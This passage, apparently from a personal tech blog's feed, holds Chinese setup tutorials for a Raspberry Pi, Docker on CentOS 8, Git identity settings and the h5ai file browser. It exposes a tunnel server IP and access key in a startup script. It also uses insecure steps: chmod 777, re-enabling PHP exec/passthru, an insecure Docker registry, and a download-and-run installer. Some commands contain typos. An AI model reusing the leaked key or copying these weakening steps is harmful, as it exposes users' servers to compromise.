href="#更换数据源，更新数据" class="headerlink" title="更换数据源，更新数据"></a>更换数据源，更新数据</h2><p>树莓派系统安装后默认使用国外的镜像源，因为墙的原因，所以在安装模块的时候速度非常慢，因此需要将镜像源换成国内的。</p><p><strong>注意：本数据源适用于4B，3B需要将数据源由stretch–&gt;buster</strong></p><p>1、打开配置sources.list文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure><p>2、用#注释掉原文件内容，用以下内容取代（Ctrl + O保存 –&gt; 回车 –&gt; 再 Ctrl + X 退出）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;raspbian&#x2F;raspbian&#x2F; buster main contrib non-free rpi</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;raspbian&#x2F;raspbian&#x2F; buster main contrib non-free rpi</span><br></pre></td></tr></table></figure><p>3、打开配置raspi.list文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;raspi.list</span><br></pre></td></tr></table></figure><p>4、用#注释掉原文件内容，用以下内容取代（Ctrl + O 保存 –&gt; 回车 –&gt; 再 Ctrl + X 退出）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;mirror.tuna.tsinghua.edu.cn&#x2F;raspberrypi&#x2F; buster main ui</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirror.tuna.tsinghua.edu.cn&#x2F;raspberrypi&#x2F; buster main ui</span><br></pre></td></tr></table></figure><p>5、编辑镜像站后，请使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="开启远程连接"><a href="#开启远程连接" class="headerlink" title="开启远程连接"></a>开启远程连接</h2><h3 id="安装xrdp"><a href="#安装xrdp" class="headerlink" title="安装xrdp"></a>安装xrdp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install xrdp</span><br></pre></td></tr></table></figure><p>Windows10 打开运行界面，<strong>输入mstsc命令</strong></p><p>关机：sudo poweroff</p><p>重启：udo reboot</p><h2 id="LNMP-Pi-Dashboard"><a href="#LNMP-Pi-Dashboard" class="headerlink" title="LNMP + Pi Dashboard"></a>LNMP + Pi Dashboard</h2><h3 id="安装-Nginx-和-PHP7"><a href="#安装-Nginx-和-PHP7" class="headerlink" title="安装 Nginx 和 PHP7"></a>安装 Nginx 和 PHP7</h3><h4 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h4><p>在 Pi 的终端运行以下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install nginx php7.3-fpm php7.3-cli php7.3-curl php7.3-gd php7.3-cgi</span><br><span class="line">sudo service nginx start</span><br><span class="line">sudo service php7.3-fpm restart</span><br></pre></td></tr></table></figure><p>如果安装成功，可通过 http://树莓派IP/ 访问到 Nginx 的默认页。Nginx 的根目录在 <code>/var/www/html</code>。</p><h4 id="让-Nginx-能处理-PHP"><a href="#让-Nginx-能处理-PHP" class="headerlink" title="让 Nginx 能处理 PHP"></a>让 Nginx 能处理 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default</span><br></pre></td></tr></table></figure><p>将其中的如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">                # First attempt to serve request as file, then</span><br><span class="line">                # as directory, then fall back to displaying a 404.</span><br><span class="line">                try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>替换为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">index  index.html index.htm index.php default.html default.htm default.php;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">location ~\.php$ &#123;</span><br><span class="line">fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.3-fpm.sock;</span><br><span class="line">#fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">include fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ctrl + O 保存再 Ctrl + X 退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx restart</span><br></pre></td></tr></table></figure><p>最后重启 Nginx 即可，以上步骤在树莓派3B + Raspbian Buster 系统版本上测试通过。4B也可以用的，别瞎想了。不能用一定是因为你漏掉了什么，再仔细检查一下。</p><h3 id="安装配置MySQL"><a href="#安装配置MySQL" class="headerlink" title="安装配置MySQL"></a>安装配置MySQL</h3><h4 id="安装软件包-1"><a href="#安装软件包-1" class="headerlink" title="安装软件包"></a>安装软件包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mariadb-server-10.0 php7.3-mysql</span><br></pre></td></tr></table></figure><h4 id="更改密码"><a href="#更改密码" class="headerlink" title="更改密码"></a>更改密码</h4><p>执行 <code>mysql</code> 命令</p><p>进入MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -u root -p</span><br></pre></td></tr></table></figure><p>初始密码随便打，直接回车</p><p>进入后修改MySQL登录密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use mysql;</span><br><span class="line">MariaDB [mysql]&gt; update user set plugin&#x3D;&#39;mysql_native_password&#39; where user&#x3D;&#39;root&#39;;</span><br><span class="line">MariaDB [mysql]&gt; UPDATE user SET password&#x3D;PASSWORD(&#39;你想要设定的密码&#39;) WHERE user&#x3D;&#39;root&#39;;</span><br><span class="line">MariaDB [mysql]&gt; flush privileges;</span><br><span class="line">MariaDB [mysql]&gt; exit;</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>mysql配置就完成了。</p><h3 id="Pi-Dashboard-介绍"><a href="#Pi-Dashboard-介绍" class="headerlink" title="Pi Dashboard 介绍"></a>Pi Dashboard 介绍</h3><p>请移步项目主页：<a href="http://make.quwj.com/project/10">http://make.quwj.com/project/10</a></p><h3 id="部署-Pi-Dashboard"><a href="#部署-Pi-Dashboard" class="headerlink" title="部署 Pi Dashboard"></a>部署 Pi Dashboard</h3><p>GitHub 部署</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;spoonysonny&#x2F;pi-dashboard.git</span><br><span class="line"></span><br><span class="line">sudo chown -R www-data pi-dashboard&#x2F;&#x2F;给权限</span><br></pre></td></tr></table></figure><p>即可通过 http://树莓派IP/pi-dashboard 访问部署好了的 Pi Dashboard。</p><h2 id="程序开机自启动配置"><a href="#程序开机自启动配置" class="headerlink" title="程序开机自启动配置"></a>程序开机自启动配置</h2><ul><li>第一步，在你要运行的程序的同级目录下（例如：home/pi/nps 下有个程序）新建一个脚本start.sh </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano start.sh</span><br></pre></td></tr></table></figure><p>脚本代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">cd &#x2F;home&#x2F;pi&#x2F;nps</span><br><span class="line">sudo .&#x2F;npc -server&#x3D;39.107.142.190:8024 -vkey&#x3D;1mr03bb3zwhp45l2 -type&#x3D;tcp</span><br></pre></td></tr></table></figure><ul><li>第二步，修改脚本文件权限！</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="keyword">chmod</span> <span class="number">777</span> /hone/pi/start.sh</span><br></pre></td></tr></table></figure><ul><li>第三步，将脚本文件添加进rc.local(一般的自启动程序都会放入此文件夹中)中！</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;rc.local    &#x2F;&#x2F;（进入此文件夹）</span><br></pre></td></tr></table></figure><p>在进到该文件中之后，找到exit 0的上一行，写入如下程序代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;pi&#x2F;start.sh start</span><br></pre></td></tr></table></figure><p>保存退出之后重启树莓派即可！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 树莓派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 8.x的Docker安装</title>
      <link href="2020/10/04/Docker%20CentOS8.1/"/>
      <url>2020/10/04/Docker%20CentOS8.1/</url>
      
        <content type="html"><![CDATA[<h1 id="CentOS-8-x-Docker的安装"><a href="#CentOS-8-x-Docker的安装" class="headerlink" title="CentOS 8.x Docker的安装"></a>CentOS 8.x Docker的安装</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文章参考<a href="https://www.cnblogs.com/lhd1998/p/13297229.html">centos8.3安装docker</a></p><h2 id="添加Docker存储库"><a href="#添加Docker存储库" class="headerlink" title="添加Docker存储库"></a>添加Docker存储库</h2><p>首先，我们必须添加一个外部存储库以获得Docker CE。我们将使用官方的Docker CE CentOS存储库。</p><h2 id="1、下载docker-ce的repo"><a href="#1、下载docker-ce的repo" class="headerlink" title="1、下载docker-ce的repo"></a>1、下载docker-ce的repo</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo -o &#x2F;etc&#x2F;yum.repos.d&#x2F;docker-ce.repo</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/jhtEbpg4m6EY4Qecbho653yBGYeyzM7mCWPExYcY5A0ICMtbSqJ6Qd9Gdib1hibaOSEdWfhx2FHYkOeFOk0WpHgg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h2 id="2、安装依赖（这是相比CentOS-7的关键步骤）"><a href="#2、安装依赖（这是相比CentOS-7的关键步骤）" class="headerlink" title="2、安装依赖（这是相比CentOS 7的关键步骤）"></a>2、安装依赖（这是相比CentOS 7的关键步骤）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/jhtEbpg4m6EY4Qecbho653yBGYeyzM7mJss8rX4RXgPeTaMfQSNujficwvhPgjUUYkKYNuPw05nSBcWNXJGKglA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h2 id="3、安装docker-ce"><a href="#3、安装docker-ce" class="headerlink" title="3、安装docker-ce"></a>3、安装docker-ce</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/jhtEbpg4m6EY4Qecbho653yBGYeyzM7mawEUR52cjIynJSaNB2yMJ95tHr5jrKPYu9OJibsnCUGkGxD0zyws2yQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h2 id="4、启动docker"><a href="#4、启动docker" class="headerlink" title="4、启动docker"></a>4、启动docker</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/jhtEbpg4m6EY4Qecbho653yBGYeyzM7msOiawQLPlVA2YiaZRvDlnhxHt3GicdXLb7IibWxgQGKZeoWSxs27YicHgew/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>我们可以用以下命令检查该服务是否正在正常运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/jhtEbpg4m6EY4Qecbho653yBGYeyzM7mqicJD1dDtpib1lzgLY4kcvNbVNPkLQyGetC00uegJTDlZfiaDcUwMydwg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><p>到此，Docker安装成功，其他功能有待测试。</p><h2 id="Centos8安装Docker流程及报错解决方案"><a href="#Centos8安装Docker流程及报错解决方案" class="headerlink" title="Centos8安装Docker流程及报错解决方案"></a>Centos8安装Docker流程及报错解决方案</h2><p><a href="https://blog.csdn.net/qq_42759386/article/details/104931165?utm_medium=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.wap_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase">Centos8安装Docker流程及报错解决方案</a></p><h1 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h1><p>它会首先搜索本地镜像，如果没有找到，它会从 Docker Hub 上拉取相应的镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull 拉取的镜像名</span><br></pre></td></tr></table></figure><h1 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it h5ai &#x2F;bin&#x2F;bash&#x2F;&#x2F;进入docker</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation  //初始化数据库</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a&#x2F;&#x2F;拿到容器ID</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 本地文件路径 ID全称:容器路径&#x2F;&#x2F;将本地文件上传到容器的指定目录中</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2018110810415992.png" alt="在这里插入图片描述"></p><p><a href="https://blog.csdn.net/xphouziyu/article/details/81838912">LAMP docker安装教程</a>，网站根目录<code>/var/www/html</code></p><p>docker容器生命周期管理</p><p>docker run 在一个新的容器执行一个命令</p><p>docker start 开一个或者更多已经停止的容器</p><p><strong>docker stop 停止一个运行的容器</strong></p><p>docker restart 重新开始一个运行的容器</p><p><strong>docker kill 杀死一个运行的容器</strong></p><p>docker rm 删除一个或更多的容器</p><p>docker pause 暂停一个容器的所有进程</p><p>docker unpaunse 恢复一个容器的所有进程</p><p>docker容器操作运维</p><p><strong>docker ps 列出容器</strong>    -a所有</p><p>docker inspect 列出关于容器或镜像的底层信息</p><p>docker top 显示一个容器运行的进程</p><p>docker attach 附上一个运行的容器</p><p>docker events 得到实时的来自服务的事件</p><p>docker log 获得一个容器的日志</p><p>docker wait 阻塞直到一个容器停止，然后打印它的退出代码</p><p>docker export 导出一个容器的文件系统作为一个tar文件</p><p><strong>docker port 列出容器映射的端口</strong></p><p>docker版本管理</p><p>docker commit 创建一个新的镜像从一个容器</p><p>docker cp 从容器复制一个文件或目录到本地目录或标准输出</p><p>docker diff 展示一个容器文件系统的变化</p><p>docker镜像仓库</p><p>docker login 登入仓库</p><p><strong>docker pull 拉取镜像</strong></p><p><strong>docker push 推送镜像</strong></p><p>docker search 搜索镜像</p><p>docker本地镜像管理</p><p><strong>docker images 列出本地的镜像</strong></p><p>docker rmi 删除本地的镜像</p><p>docker tag 打标签本地的镜像</p><p>docker build 通过Dockerfile构建本地的镜像</p><p><strong>docker histroy 列出镜像的历史</strong></p><p>docker save 保存本地的镜像为一个tar文件</p><p>docker import 通过tar导入镜像</p><p>docker load 加载tar镜像</p><p>docker其它命令</p><p>docker info</p><p>docker version</p><h2 id="docker私有仓库操作"><a href="#docker私有仓库操作" class="headerlink" title="docker私有仓库操作"></a>docker私有仓库操作</h2><p>\1. 配置docker daemon的参数，由于每个发行版的linux的init系统不用，所以使用通用的命令行方式重启docker daemon</p><p>docker daemon –insecure-registry 192.168.6.65:5000 &amp;</p><p>\2. 认证私有仓库</p><p>docker login -u  -p  -e  192.168.6.65:5000</p><p>\3. 拉取镜像</p><p>docker pull 192.168.6.65:5000/centos:latest</p><p>\4. tag本地镜像</p><p>docker tag 192.168.6.65:5000/centos:1.0.0 192.168.6.65:5000/centos:latest</p><p>\5. 推送镜像</p><p>docker push 192.168.6.65:5000/centos:1.0.0</p><p>6.docker， mac 的镜像目录</p><p>/Users/{YourUserName}/Library/Containers/com.docker.docker/Data/com.docker.driver.amd64-linux/Docker.qcow2 保存到文件当中</p><h2 id="docker-run-命令详解"><a href="#docker-run-命令详解" class="headerlink" title="docker run 命令详解"></a>docker run 命令详解</h2><h4 id="docker-run-OPTIONS-IMAGE-COMMAND-ARG…"><a href="#docker-run-OPTIONS-IMAGE-COMMAND-ARG…" class="headerlink" title="docker run [OPTIONS] IMAGE [COMMAND] [ARG…]"></a>docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</h4><p>-d,–detach=false指定容器运行于前台还是后台，默认为false</p><p>-i,–interactive=false打开STDIN，用于控制台交互</p><p>-t,–tty=false分配tty设备，该可以支持终端登录，默认为false</p><p>-u,–user=””指定容器的用户</p><p>-a,–attach=[]      登录容器（必须是以docker run -d启动的容器）</p><p>-w,–workdir=””指定容器的工作目录</p><p>-c,–cpu-shares=0设置容器CPU权重，在CPU共享场景使用</p><p>-e,–env=[]        指定环境变量，容器中可以使用该环境变量</p><p>-m,–memory=””指定容器的内存上限</p><p>-P,–publish-all=false指定容器暴露的端口</p><p>-p,–publish=[]      指定容器暴露的端口</p><p>-h,–hostname=””指定容器的主机名</p><p>-v,–volume=[]      给容器挂载存储卷，挂载到容器的某个目录</p><p>–volumes-from=[]     给容器挂载其他容器上的卷，挂载到容器的某个目录</p><p>–cap-add=[]        添加权限，权限清单详见：<a href="http://linux.die.net/man/7/capabilities">http://linux.die.net/man/7/capabilities</a></p><p>–cap-drop=[]       删除权限，权限清单详见：<a href="http://linux.die.net/man/7/capabilities">http://linux.die.net/man/7/capabilities</a></p><p>–cidfile=””运行容器后，在指定文件中写入容器PID值，一种典型的监控系统用法</p><p>–cpuset=””设置容器可以使用哪些CPU，此参数可以用来容器独占CPU</p><p>–device=[]        添加主机设备给容器，相当于设备直通</p><p>–dns=[]          指定容器的dns服务器</p><p>–dns-search=[]      指定容器的dns搜索域名，写入到容器的/etc/resolv.conf文件</p><p>–entrypoint=””覆盖image的入口点</p><p>–env-file=[]       指定环境变量文件，文件格式为每行一个环境变量</p><p>–expose=[]        指定容器暴露的端口，即修改镜像的暴露端口</p><p>–link=[]         指定容器间的关联，使用其他容器的IP、env等信息</p><p>–lxc-conf=[]       指定容器的配置文件，只有在指定–exec-driver=lxc时使用</p><p>–name=””指定容器名字，后续可以通过名字进行容器管理，links特性需要使用名字</p><p>–net=”bridge”容器网络设置:</p><p>bridge 使用docker daemon指定的网桥</p><p>host  //容器使用主机的网络</p><p>container:NAME_or_ID&gt;//使用其他容器的网路，共享IP和PORT等网络资源</p><p>none 容器使用自己的网络（类似–net=bridge），但是不进行配置</p><p>–privileged=false指定容器是否为特权容器，特权</p><p>容器拥有所有的capabilities</p><p>–restart=”no”指定容器停止后的重启策略:</p><p>no：容器退出时不重启</p><p>on-failure：容器故障退出（返回值非零）时重启</p><p>always：容器退出时总是重启</p><p>–rm=false指定容器停止后自动删除容器(不支持以docker run -d启动的容器)</p><p>–sig-proxy=true设置由代理接受并处理信号，但是SIGCHLD、SIGSTOP和SIGKILL不能被代理</p><p>example：</p><p>1.docker run -d–name=server-db -p 3306:3306 centos6.8-mysql /usr/bin/mysql_safe –d</p><p>主机3306端口映射到容器3306端口</p><p>2.docker run -it –rm centos6.8 容器结束后自动删除</p><p>3.docker run -d–name=server-db -p 3306:3306 -v /server/mysql-data:/mysql-data centos6.8-mysql /usr/bin/mysql_safe –d</p><p>将主机的/server/mysql-data 目录映射到容器 /mysql-data 中</p><h2 id="docker-技巧"><a href="#docker-技巧" class="headerlink" title="docker 技巧"></a>docker 技巧</h2><p>1..清理无用的docker容器命令</p><p>docker ps -aqf  status=exited | xargs docker rm</p><p>2.清理无用镜像的命令</p><p>docker images -qf dangling=true | xargs docker rmi</p><p>3.清理无用的docker挂载</p><p>docker volume rm $(docker volume ls -q -f dangling=true)</p><p>dockerignore使用</p><p>类似.gitignore一样，运行Dockerfile里的COPY指令的时候会根据.dockerignore进行部分目录或者文件忽略。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> docker </tag>
            
            <tag> vps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git常见指令</title>
      <link href="2020/09/08/Git%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/"/>
      <url>2020/09/08/Git%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="1-1本地库初始化"><a href="#1-1本地库初始化" class="headerlink" title="1.1本地库初始化"></a>1.1本地库初始化</h2><p><strong>命令：</strong>git init</p><p>会在当前目录下创建一个隐藏目录 “.git”，会存放当前项目本地库相关的子目录和文件，非常重要，不要乱搞！！！</p><h2 id="1-2设置签名"><a href="#1-2设置签名" class="headerlink" title="1.2设置签名"></a>1.2设置签名</h2><p><strong>形式：</strong></p><ul><li>用户名：Antlers</li><li>Email地址：<a href="mailto:&#50;&#51;&#x33;&#51;&#x40;&#57;&#x39;&#57;&#46;&#99;&#111;&#109;">&#50;&#51;&#x33;&#51;&#x40;&#57;&#x39;&#57;&#46;&#99;&#111;&#109;</a></li></ul><p><strong>作用：</strong>区分不同的开发人员身份，可以随便写一个甚至不存在的地址</p><p><strong>辨析：</strong>这个设置的签名和登录<strong>远程库</strong>（<strong>代码托管中心</strong>，例如：GitHub）的账号、密码是不一样的</p><p><strong>命令：</strong></p><ul><li>项目级别/仓库级别：仅在当前本地库范围有效<ul><li>git <strong>config</strong> user.name antlers_pro        //后面跟上的_pro是自我提示为项目级别</li><li>git <strong>config</strong> user.email <a href="mailto:&#50;&#51;&#51;&#51;&#95;&#x70;&#x72;&#x6f;&#64;&#x39;&#57;&#57;&#46;&#99;&#111;&#109;">&#50;&#51;&#51;&#51;&#95;&#x70;&#x72;&#x6f;&#64;&#x39;&#57;&#57;&#46;&#99;&#111;&#109;</a></li><li>信息保存位置：./.git/config 文件下</li></ul></li><li>系统用户级别：登录当前操作系统的用户范围<ul><li>git config <em>–global</em> user.name antlers_glb</li><li>git config <em>–global</em> user.email <a href="mailto:&#x32;&#x33;&#x33;&#x33;&#95;&#112;&#114;&#111;&#64;&#x39;&#57;&#x39;&#46;&#x63;&#111;&#x6d;">&#x32;&#x33;&#x33;&#x33;&#95;&#112;&#114;&#111;&#64;&#x39;&#57;&#x39;&#46;&#x63;&#111;&#x6d;</a></li><li>信息保存位置：~/.gitconfig 文件下</li></ul></li></ul><p><strong>级别优先级：</strong></p><p>​    就近原则：项目级别优先于系统级别</p><p>​    二者都没有是不被允许的，操作会报错</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H5ai的搭建</title>
      <link href="2020/08/15/h5ai%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>2020/08/15/h5ai%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="H5ai的搭建"><a href="#H5ai的搭建" class="headerlink" title="H5ai的搭建"></a>H5ai的搭建</h1><h2 id="一、搭建LNMP框架"><a href="#一、搭建LNMP框架" class="headerlink" title="一、搭建LNMP框架"></a>一、搭建LNMP框架</h2><p>搭建h5ai首先需要准备搭建好<strong>LNMP</strong>框架，这里我们用军哥的<strong>LNMP</strong>一键安装，使用一键安装可以很方便的选择不同的版本进行安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;soft.vpser.net&#x2F;lnmp&#x2F;lnmp1.6.tar.gz -cO lnmp1.6.tar.gz &amp;&amp; tar zxf lnmp1.6.tar.gz &amp;&amp; cd lnmp1.6 &amp;&amp; .&#x2F;install.sh lnmp </span><br></pre></td></tr></table></figure><p>请注意最后面的<strong>LNMP</strong>参数，如需要<strong>LNMPA</strong>或<strong>LAMP</strong>式，请替换<strong>LNMP</strong>为你要安装的模式。     </p><p>具体安装就去看军哥的教程：<a href="https://lnmp.org/install.html">https://lnmp.org/install.html</a></p><h2 id="二、配置H5ai"><a href="#二、配置H5ai" class="headerlink" title="二、配置H5ai"></a>二、配置H5ai</h2><ol><li><p>下载<strong>h5ai</strong>并解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;wwwroot&#x2F;H5ai</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;release.larsjung.de&#x2F;h5ai&#x2F;h5ai-0.29.2.zip</span><br><span class="line"></span><br><span class="line">unzip h5ai-0.29.2.zip</span><br></pre></td></tr></table></figure></li><li><p>修改默认首页的配置项</p><p><strong>nginx 1.2</strong> 在 <code>nginx.conf</code> 中的修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;vhost&#x2F;Filename.conf</span><br></pre></td></tr></table></figure><p>找到index，进行修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index index.html index.php &#x2F;_h5ai&#x2F;public&#x2F;index.php</span><br></pre></td></tr></table></figure></li><li><p>修改PHP配置-禁用函数，解除禁用函数scandir、exec和passthru、putenv</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini</span><br></pre></td></tr></table></figure><p>找到这一行：<code>disable_functions =</code>，删除被禁用的函数</p></li></ol><h2 id="三、测试-amp-完善H5ai"><a href="#三、测试-amp-完善H5ai" class="headerlink" title="三、测试&amp;完善H5ai"></a>三、测试&amp;完善H5ai</h2><ol><li><p>访问<code>http://你的域名或IP/_h5ai/public/index.php</code>进入后台检查，默认密码为空，直接点击login进入</p><p>后台会检查安装情况，最好都yes！</p></li><li><p><strong>PDF thumbs</strong></p><p>这里需要安装安装imagemagick扩展</p><p>Ubuntu/Debian系统：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install imagemagick -y</span><br></pre></td></tr></table></figure><p>CentOS系统:</p><figure class="highlight plain"><table><tr><td 